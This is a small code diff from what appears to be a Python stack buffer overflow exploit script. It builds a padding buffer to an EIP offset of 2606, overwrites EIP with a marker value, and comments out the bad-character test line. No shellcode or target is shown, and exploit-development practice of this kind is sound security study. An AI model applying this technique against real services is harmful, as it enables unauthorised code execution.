@@ -21,7 +21,7 @@ offset_to_eip =  2606
 total_size =  3500
 buffer = "A" * offset_to_eip
 buffer += "BBBB"
-buffer += badchars
+#buffer += badchars
 buffer += "A" * (total_size - len(buffer))
 
 try:
